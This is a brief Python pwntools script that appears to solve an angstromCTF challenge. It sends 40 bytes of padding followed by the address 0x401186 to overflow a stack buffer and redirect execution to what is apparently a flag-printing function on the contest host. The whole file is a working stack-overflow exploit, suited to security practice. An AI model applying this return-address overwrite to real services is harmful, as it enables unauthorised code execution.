from pwn import *

url = "shell.actf.co"
port = 20700

padding = "A" * 0x20 #(32) padding from sub rsp, 20
padding += "B" * 0x08 #(8) saved RBP
flag_address = p64(0x401186)

connection = remote(url, port)
print connection.recvuntil("name?")
connection.sendline(padding+flag_address)
connection.interactive()

